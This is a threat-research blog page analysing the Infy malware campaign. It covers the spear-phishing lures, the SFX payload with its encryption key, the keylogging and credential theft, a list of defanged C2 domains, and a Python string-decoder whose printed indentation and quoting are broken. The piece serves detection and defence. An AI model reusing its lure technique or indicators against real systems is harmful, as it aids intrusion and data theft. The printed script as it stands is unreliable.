<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Prince of Persia: Infy Malware Active In Decade of Targeted Attacks</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-13441 entry-meta">
			
			
			<span class="post-views-count">22,159</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'13441','like')"><i class="ui ui-2"></i><span class="ml-5">0</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 10</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fprince-of-persia-infy-malware-active-in-decade-of-targeted-attacks%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Fprince-of-persia-infy-malware-active-in-decade-of-targeted-attacks%2F+-+Prince+of+Persia%3A+Infy+Malware+Active+In+Decade+of+Targeted+Attacks" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fprince-of-persia-infy-malware-active-in-decade-of-targeted-attacks%2F&title=Prince+of+Persia%3A+Infy+Malware+Active+In+Decade+of+Targeted+Attacks&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/tomer-bar/" title="Posts by Tomer Bar" class="author url fn" rel="author">Tomer Bar</a> and <a href="https://unit42.paloaltonetworks.com/author/simon-conant/" title="Posts by Simon Conant" class="author url fn" rel="author">Simon Conant</a>        </p>
        <p><time datetime="2016-05-02T02:00:08+00:00">May 2, 2016 at 5:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/malware-2/" rel="category tag">Malware</a>, <a href="https://unit42.paloaltonetworks.com/category/threat-prevention-2/" rel="category tag">Threat Prevention</a>, <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/autofocus/" rel="tag">AutoFocus</a>, <a href="https://unit42.paloaltonetworks.com/tag/infy/" rel="tag">Infy</a>, <a href="https://unit42.paloaltonetworks.com/tag/microsoft/" rel="tag">microsoft</a>, <a href="https://unit42.paloaltonetworks.com/tag/wildfire/" rel="tag">WildFire</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p>Attack campaigns that have very limited scope often remain hidden for years. If only a few malware samples are deployed, it’s less likely that security industry researchers will identify and connect them together.</p>
<p>In May 2015, Palo Alto Networks WildFire detected two e-mails carrying malicious documents from a genuine and compromised Israeli Gmail account, sent to an Israeli industrial organization. One e-mail carried a Microsoft PowerPoint file named “thanks.pps” (<a href="https://www.virustotal.com/en/file/a1d5ab7125f002262151e516151e9b9223b3f5ca3863d69dd8a12b066c162906/analysis/" target="_blank">VirusTotal</a>), the other a Microsoft Word document named “request.docx”.</p>
<p>Around the same time, WildFire also captured an e-mail containing a Word document (“hello.docx”) with an identical hash as the earlier Word document, this time sent to a U.S. Government recipient.<span id="more-13441"></span></p>
<p>Based on various attributes of these files and the functionality of the malware they install, we have identified and collected over 40 variants of a previously unpublished malware family we call Infy, which has been involved in attacks stretching back to 2007. Attacks using this tool were still active as of April 2016.</p>
<h3>Attack Technique</h3>
<p>The attacks we have identified carrying Infy begin with a spear-phishing e-mail carrying a Word or PowerPoint document. The attached document file contains a multi-layer Self-Extracting Executable Archive (SFX), and content attempting to social engineer the recipient into activating the executable. In this example, the PPS file, when clicked, opens in “PowerPoint Show” mode. The user sees a PowerPoint page (Figure 1) that mimics a paused movie, and is tricked into clicking “Run” (Figure 2), which allows the embedded SFX file to execute.</p>
<p><a href="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-1.png"  rel="wpdevart_lightbox attachment wp-att-13442" ><img class="aligncenter size-large wp-image-13442" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-1-500x275.png" alt="Prince of Persia 1" width="500" height="275" /></a></p>
<p style="text-align: center;"><em>Figure 1 PowerPoint page mimics a paused video</em></p>
<p><a href="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-2.png"  rel="wpdevart_lightbox attachment wp-att-13443" ><img class="aligncenter size-large wp-image-13443" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-2-500x278.png" alt="Prince of Persia 2" width="500" height="278" /></a></p>
<p style="text-align: center;"><em>Figure 2 User tricked into running embedded SFX EXE</em></p>
<p>One of the SFX layers is encrypted with the key “1qaz2wsx3edc”. The package (Figure 3) typically includes a fake readme.txt file as camouflage (for example, impersonating an Aptana Studio application), and in some campaigns, image or video files (Figure 4). The executable typically has a filename pattern ins[*].exe where * are random digits of up to 4 characters. The main payload is a DLL file with a typical filename pattern mpro[*].dll where * are random digits of up to 3 characters (early versions used a .cpl extension).</p>
<p><a href="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-3.png"  rel="wpdevart_lightbox attachment wp-att-13444" ><img class="aligncenter size-large wp-image-13444" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-3-500x104.png" alt="Prince of Persia 3" width="500" height="104" /></a></p>
<p style="text-align: center;"><em>Figure 3 Embedded SFX contents</em></p>
<p><a href="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-4_1.png"  rel="wpdevart_lightbox attachment wp-att-13445" ><img class="aligncenter size-large wp-image-13445" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-4_1-500x85.png" alt="Prince of Persia 4_1" width="500" height="85" /></a></p>
<p><a href="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-4_2.png"  rel="wpdevart_lightbox attachment wp-att-13446" ><img class="aligncenter size-large wp-image-13446" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-4_2.png" alt="Prince of Persia 4_2" width="112" height="149" /></a></p>
<p style="text-align: center;"><em>Figure 4 Some campaigns include image or video files as camouflage</em></p>
<p>The executable installs the DLL, writes to the autorun registry key, and doesn’t activate until a reboot. After reboot, it first checks for antivirus and then connects to the C2. It starts collecting environment data, initiates a keylogger, and steals browser passwords and content such as cookies, before exfiltrating the stolen data to the C2 server.</p>
<p>The initially-observed “thanks.pps” example tricks the user into running the embedded file named ins8376.exe which loads a payload DLL named mpro324.dll.</p>
<h3>Infrastructure</h3>
<p>In our initial samples, we observed C2 servers updateserver3[.]com and us1s2[.]strangled[.]net.</p>
<p>Other campaigns use a combination of Dynamic DNS providers, third-party site hosting services, and apparently first-party-registered domains as C2 servers.</p>
<p>Analysis of hosting and WHOIS data (Figure 5) led to a total of 12 related first-party-registered domains used for C2 servers:</p>
<ul>
<li>bestbox3[.]com</li>
<li>myblog2000[.]com</li>
<li>safehostonline[.]com</li>
<li>updateserver3[.]com</li>
<li>short-name[.]com</li>
<li>bestupdateserver2[.]com</li>
<li>bestwebstat[.]com</li>
<li>updatebox4[.]com</li>
<li>bestupdateserver[.]com</li>
<li>short-url20[.]com</li>
<li>updateserver1[.]com</li>
<li>box4054[.]net</li>
</ul>
<p>Ages of these domains suggest that some may have been used for malicious activity back as far as early 2010.</p>
<p>We found a <a href="https://fe-ddis.dk/cfcs/CFCSDocuments/Phishing%20uden%20fangst.pdf" target="_blank">report by the Danish Defense Intelligence Service’s Center for Cybersecurity</a>, which had observed similar attacks against Danish Government targets, and documented a small portion of the same C2 infrastructure.</p>
<p><a href="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-5.png"  rel="wpdevart_lightbox attachment wp-att-13447" ><img class="aligncenter size-large wp-image-13447" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-5-500x739.png" alt="Prince of Persia 5" width="500" height="739" /></a></p>
<p style="text-align: center;"><em>Figure 5 Infrastructure and Actor information related to Infy Attacks</em></p>
<p>We initially found a file with an identical hash as the originally-observed PowerPoint file, but a different filename (“syria.pps”), uploaded to VirusTotal (Figure 6) also in May of 2015. A characteristic observed across these campaigns is that the actor puts deliberate effort into the specific geographic targeting, with region-specific attack content.</p>
<p><a href="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-6.png"  rel="wpdevart_lightbox attachment wp-att-13448" ><img class="aligncenter size-large wp-image-13448" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-6-500x134.png" alt="Prince of Persia 6" width="500" height="134" /></a></p>
<p style="text-align: center;"><em>Figure 6 Powerpoint file uploaded to VirusTotal with a different file name</em></p>
<p>We were subsequently able to pivot and associate additional malware and campaigns based on infrastructure, hashes, strings, and payload links and similarities. The most conclusive evidence that all of these are linked is found in a single key, used to encode strings within the malware across all examples. Only the offset varies: older versions encode just the C2 data, newer versions encode most strings, and some double-encode the C2 data with two different offsets. The following script can be used to decode these strings:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69286c4540d213849744" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
import string
import base64
FIRST_PHASE = "OQTJEqtsK0AUB9YXMwr8idozF7VWRPpnhNCHI6Dlkaubyxf5423jvcZ1LSGmge"
SECOND_PHASE = "" + "PqOwI1eUrYtT2yR3p4E5o6WiQu7ASlDkFj8GhHaJ9sKdLfMgNzBx0ZcXvCmVnb“
def decrypt(input, offset=-10):
    result = ""
    for i, c in enumerate(input):
        i = i % 62 + 1
        try:
         index = FIRST_PHASE.index(c)
     except ValueError:
         result += c
         continue
     translated = SECOND_PHASE[(index - i + offset) % len(SECOND_PHASE)]
     result += translated
return result</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69286c4540d213849744-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69286c4540d213849744-2">2</div><div class="crayon-num" data-line="crayon-5f69286c4540d213849744-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69286c4540d213849744-4">4</div><div class="crayon-num" data-line="crayon-5f69286c4540d213849744-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69286c4540d213849744-6">6</div><div class="crayon-num" data-line="crayon-5f69286c4540d213849744-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69286c4540d213849744-8">8</div><div class="crayon-num" data-line="crayon-5f69286c4540d213849744-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69286c4540d213849744-10">10</div><div class="crayon-num" data-line="crayon-5f69286c4540d213849744-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69286c4540d213849744-12">12</div><div class="crayon-num" data-line="crayon-5f69286c4540d213849744-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69286c4540d213849744-14">14</div><div class="crayon-num" data-line="crayon-5f69286c4540d213849744-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69286c4540d213849744-16">16</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69286c4540d213849744-1"><span class="crayon-e">import </span><span class="crayon-t">string</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69286c4540d213849744-2"><span class="crayon-e">import </span><span class="crayon-e">base64</span></div><div class="crayon-line" id="crayon-5f69286c4540d213849744-3"><span class="crayon-v">FIRST_PHASE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"OQTJEqtsK0AUB9YXMwr8idozF7VWRPpnhNCHI6Dlkaubyxf5423jvcZ1LSGmge"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69286c4540d213849744-4"><span class="crayon-v">SECOND_PHASE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"PqOwI1eUrYtT2yR3p4E5o6WiQu7ASlDkFj8GhHaJ9sKdLfMgNzBx0ZcXvCmVnb“</span></div><div class="crayon-line" id="crayon-5f69286c4540d213849744-5"><span class="crayon-s">def decrypt(input, offset=-10):</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69286c4540d213849744-6"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;result = "</span>"</div><div class="crayon-line" id="crayon-5f69286c4540d213849744-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">enumerate</span><span class="crayon-sy">(</span><span class="crayon-v">input</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69286c4540d213849744-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-cn">62</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-5f69286c4540d213849744-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69286c4540d213849744-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">index</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">FIRST_PHASE</span><span class="crayon-sy">.</span><span class="crayon-e">index</span><span class="crayon-sy">(</span><span class="crayon-v">c</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69286c4540d213849744-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">except </span><span class="crayon-v">ValueError</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69286c4540d213849744-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">result</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-i">c</span></div><div class="crayon-line" id="crayon-5f69286c4540d213849744-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">continue</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69286c4540d213849744-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">translated</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">SECOND_PHASE</span><span class="crayon-sy">[</span><span class="crayon-sy">(</span><span class="crayon-v">index</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">offset</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-e">len</span><span class="crayon-sy">(</span><span class="crayon-v">SECOND_PHASE</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f69286c4540d213849744-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">result</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-e">translated</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69286c4540d213849744-16"><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">result</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0008 seconds] -->
<p>Based on this specific encoding technique and key, we have identified related Infy samples from as early as mid 2007 (Figure 7), although more frequent related activity is observed after 2011. Historic registration of the C2 domain associated with the oldest sample that we found, fastupdate[.]net, suggests that it may have been associated with malicious activity as far back as December 2004.</p>
<p>Over the years, we notice continued development and feature improvement in the code. For instance, support for the new Microsoft Edge browser was recently introduced in “version 30”.</p>
<p><a href="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-7.png"  rel="wpdevart_lightbox attachment wp-att-13449" ><img class="aligncenter size-large wp-image-13449" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/04/Prince-of-Persia-7-500x124.png" alt="Prince of Persia 7" width="500" height="124" /></a></p>
<p style="text-align: center;"><em>Figure 7 Oldest related example found dates to 2007</em></p>
<p>Most of the associated malware samples dating back over the last five years were eventually detected by antivirus programs, but in most cases with a generic signature. Other examples are named with multiple unrelated signature classifications, including Win32/Tuax.A (very old versions), W32/ADOKOOB, Win32/Cloptern.A &amp; B (old versions), TR/Graftor.106254, TR/Spy.Arpnatis.A, and Win32/Skeeyah.A!bit.</p>
